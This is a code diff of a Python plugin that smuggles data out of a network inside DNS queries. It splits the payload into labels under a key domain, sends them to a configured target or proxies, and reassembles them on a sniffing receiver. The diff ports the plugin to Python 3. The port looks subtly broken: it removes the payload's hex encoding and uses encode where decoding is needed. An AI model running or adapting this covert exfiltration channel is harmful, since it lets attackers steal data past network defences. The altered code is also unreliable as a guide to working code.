@@ -8,10 +8,10 @@ app_exfiltrate = None
 config = None
 buf = {}
 
-def handle_dns_query(qname):
+def handle_dns_query(qname: str):
     global buf
     try:
-        if (config['key'] in qname):
+        if config['key'] in qname:
             app_exfiltrate.log_message(
                 'info', '[dns] DNS Query: {0}'.format(qname))
             jobid = qname[0:7]
@@ -26,13 +26,13 @@ def handle_dns_query(qname):
             last_label_len = (252 - len(config['key'])) % 64
             max_query = 252 if last_label_len == 1 else 253
             if (len(qname) < max_query):
-                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
+                app_exfiltrate.retrieve_data(''.join(buf[jobid]).encode())
                 buf[jobid] = []
     except Exception as e:
         # print(e)
         pass
 
-def relay_dns_query(domain):
+def relay_dns_query(domain: str):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
@@ -61,20 +61,19 @@ def sniff(handler):
 #Send data over multiple labels (RFC 1034)
 #Max query is 253 characters long (textual representation)
 #Max label length is 63 bytes
-def send(data):
+def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
     else:
         targets = [config['target']]
     port = config['port']
-    jobid = data.split("|!|")[0]
-    data = data.encode('hex')
+    jobid: str = data.split("|!|")[0]
     domain = ""
 
     #Calculate the remaining length available for our payload
     rem = 252 - len(config['key'])
     #Number of 63 bytes labels
-    no_labels = rem / 64 #( 63 + len('.') )
+    no_labels = rem // 64 #( 63 + len('.') )
     #Length of the last remaining label
     last_label_len = (rem % 64) - 1
 
@@ -94,9 +93,11 @@ def send(data):
                 label = data[:last_label_len]
                 data = data[last_label_len:]
                 domain += label + '.' + config['key']
+
+        print(domain)
         q = DNSRecord.question(domain)
         domain = ""
-        target = choice(targets)
+        target = choice(targets).encode()
         try:
             q.send(target, port, timeout=0.01)
         except:
